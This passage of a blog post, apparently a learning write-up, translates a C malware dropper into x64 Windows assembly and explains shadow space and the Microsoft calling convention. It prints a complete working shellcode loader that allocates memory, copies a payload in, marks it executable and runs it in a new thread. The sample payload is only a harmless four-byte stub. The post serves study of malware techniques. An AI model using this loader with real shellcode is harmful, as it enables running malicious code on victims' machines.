<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="no">h</span><span class="w">    </span><span class="c1">; Add the shadow space</span>
<span class="w">    </span><span class="nf">call</span><span class="w"> </span><span class="no">rax</span><span class="w">        </span><span class="c1">; Call the function</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="no">h</span><span class="w">    </span><span class="c1">; Remove the shadow space</span>
<span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="no">rbx</span><span class="w">         </span><span class="c1">; Go back to the stored instruction address</span>
<span class="w">    </span><span class="nf">ret</span>
</code></pre></div>

<p>To call the routine, just do this:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">getchar</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">shadow_call</span>
</code></pre></div>

<p>But honestly, I think it's less complicated to just do the handling of shadow space yourself.</p>
<p>Shadow spaces threw me off a bit when I was researching about this, but everything I said above should be enough of an explanation. If however you want more then go <a href="https://retroscience.net/x64-assembly.html">here</a> and then <a href="https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735">here</a>.</p>
<h2 id="microsoft-x64-calling-convention">Microsoft x64 Calling Convention</h2>
<p>It is also important to note that the calling convention for functions is different for Windows compared to other operating systems.</p>
<p>As a quick reference, if you are going to pass parameters to a function you need to use registers <code>rcx</code>, <code>rdx</code>, <code>r8</code>, and <code>r9</code> for the first, second, third, and fourth parameters respectively.</p>
<p>Here's an example from our code:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="c1">// Make new buffer as executable</span>
<span class="w">    </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
</code></pre></div>

<p>In assembly, we supply the parameters like so:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="c1">;; Make new buffer as executable</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span><span class="w">      </span><span class="c1">;; First parameter</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">dl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span><span class="w">    </span><span class="c1">;; Second parameter</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="mi">0x20</span><span class="w">             </span><span class="c1">;; Third parameter</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">old_protect</span><span class="p">]</span><span class="w">    </span><span class="c1">;; Fourth parameter</span>
<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">          </span><span class="c1">;; Reserve shadow space</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">VirtualProtect</span><span class="w">   </span><span class="c1">;; Call function</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">          </span><span class="c1">;; Release shadow space</span>
</code></pre></div>

<p>For functions that require more than four parameters, the stack needs to be utilized. This can get confusing so let me point you to <a href="https://sonictk.github.io/asm_tutorial/#windows:thewindowtothehardware/themicrosoftx64callingconvention">this post</a> as it has diagrams for visualization.</p>
<h2 id="the-final-code">The final code</h2>
<p>The rest of the code can be converted using the concepts I've described above. Here is the fully converted code:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">bits</span><span class="w"> </span><span class="mi">64</span>
<span class="w">    </span><span class="nf">default</span><span class="w"> </span><span class="no">rel</span>

<span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
<span class="w">    </span><span class="nf">msg_hello</span><span class="w">   </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hello</span><span class="w"> </span><span class="no">world</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nf">msg_exec_addr</span><span class="w">   </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">exec_mem</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nf">msg_pload_addr</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">payload</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">   </span>
<span class="w">    </span><span class="no">msg_format</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;%</span><span class="mi">-20</span><span class="no">s</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="no">x</span><span class="err">%</span><span class="mi">-016</span><span class="no">p</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nf">msg_hit_me</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hit</span><span class="w"> </span><span class="no">me</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>

<span class="w">    </span><span class="c1">;; 4 byte payload</span>
<span class="w">    </span><span class="nf">payload</span><span class="w">     </span><span class="no">db</span><span class="w">  </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0xCC</span><span class="p">,</span><span class="w"> </span><span class="mi">0xC3</span>
<span class="w">    </span><span class="nf">payload_len</span><span class="w">     </span><span class="no">db</span><span class="w">  </span><span class="mi">4</span>

<span class="nf">segment</span><span class="w"> </span><span class="no">.bss</span><span class="w">    </span>
<span class="w">    </span><span class="no">exec_mem</span><span class="w">    </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span>
<span class="w">    </span><span class="nf">old_protect</span><span class="w"> </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span><span class="w">   </span>

<span class="no">segment</span><span class="w"> </span><span class="no">.text</span>
<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">printf</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualAlloc</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualProtect</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">RtlMoveMemory</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">getchar</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">CreateThread</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">WaitForSingleObject</span>

<span class="nl">main:</span>
<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
<span class="w">    </span><span class="nf">mov</span><span class="w">     </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>

<span class="w">    </span><span class="c1">;; Allocate a memory buffer for payload.</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">dl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="mi">0x3000</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="mi">0x4</span>
<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">VirtualAlloc</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>

<span class="w">    </span><span class="no">mov</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">],</span><span class="w"> </span><span class="no">rax</span>

<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_format</span><span class="p">]</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_pload_addr</span><span class="p">]</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="no">payload</span>
<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">printf</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>

<span class="w">    </span><span class="no">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_format</span><span class="p">]</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_exec_addr</span><span class="p">]</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>

<span class="w">    </span><span class="c1">;; Copy payload to new buffer</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload</span><span class="p">]</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="no">r8</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8b</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span>
<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">     </span>
<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">RtlMoveMemory</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>

<span class="w">    </span><span class="c1">;; Make new buffer as executable</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">dl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span>
<span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="mi">0x20</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">old_protect</span><span class="p">]</span>
<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">     </span>
<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">VirtualProtect</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span>

<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">         </span>
<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">printf</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>

<span class="w">    </span><span class="no">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">             </span>
<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">getchar</span>
<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>

<span class="w">    </span><span class="c1">;; If all good, run the payload </span>
<span class="w">    </span><span class="nf">jz</span><span class="w">  </span><span class="no">ifrvzero</span>

<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rcx</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">r9</span>
<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">r9</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">CreateThread</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">0xFFFFFFFF</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">WaitForSingleObject</span>

<span class="nl">ifrvzero:</span>

<span class="w">    </span><span class="nf">xor</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ExitProcess</span>
</code></pre></div>

<p>As mentioned before, I did my best to match the structure of the C code to the assembly code to make it easy to compare how one section was translated to the other. There are other parts like the <code>jz ifrvzero</code> conditonal jump that I didn't discuss, but those can be easily be understood if you know the basics in assembly.</p>
<p>I've also uploaded the code on it's own repository <a href="https://github.com/accidentalrebel/malware-dropper-x64-win-assembly">here</a>. Updates and fixes to the code will be pushed there.</p>
<hr />
<p>A lot of the concepts I've described in this post were the lessons I learned while working on this project. Most of these can be researched but I'm hoping that collecting them in one location would benefit the next bloke who is crazy like me to do the same.</p>
<p>Feel free to reach out to me on <a href="https://twitter.com/accidentalrebel">Twitter</a> or <a href="https://www.linkedin.com/in/juan-karlo-licudine/">LinkedIn</a> for any questions or comments.</p>
        </div>

        <div class="tags">
            <a href="../tag/malware.html" class="tag">malware</a>
            <a href="../tag/assembly.html" class="tag">assembly</a>
            <a href="../tag/reverse-engineering.html" class="tag">reverse-engineering</a>
        </div>
    </article>

<nav class="pagination">
        <a href="../author/accidentalrebel2.html">&laquo; Previous</a>

        <a href="../index.html">1</a>
        <a href="../author/accidentalrebel2.html">2</a>
        <span class="current">3</span>
        <a href="../author/accidentalrebel4.html">4</a>
        <a href="../author/accidentalrebel5.html">5</a>
        <a href="../author/accidentalrebel6.html">6</a>
        <a href="../author/accidentalrebel7.html">7</a>
        <a href="../author/accidentalrebel8.html">8</a>
        <a href="../author/accidentalrebel9.html">9</a>
        <a href="../author/accidentalrebel10.html">10</a>
        <a href="../author/accidentalrebel11.html">11</a>
        <a href="../author/accidentalrebel12.html">12</a>
        <a href="../author/accidentalrebel13.html">13</a>
        <a href="../author/accidentalrebel14.html">14</a>
        <a href="../author/accidentalrebel15.html">15</a>

    <a href="../author/accidentalrebel4.html">Next &raquo;</a>
</nav>
        </div>
    </main>

    <script src="../theme/js/main.js"></script>
    
    <!-- Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-55068085-2"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-55068085-2');
    </script>
</body>
</html>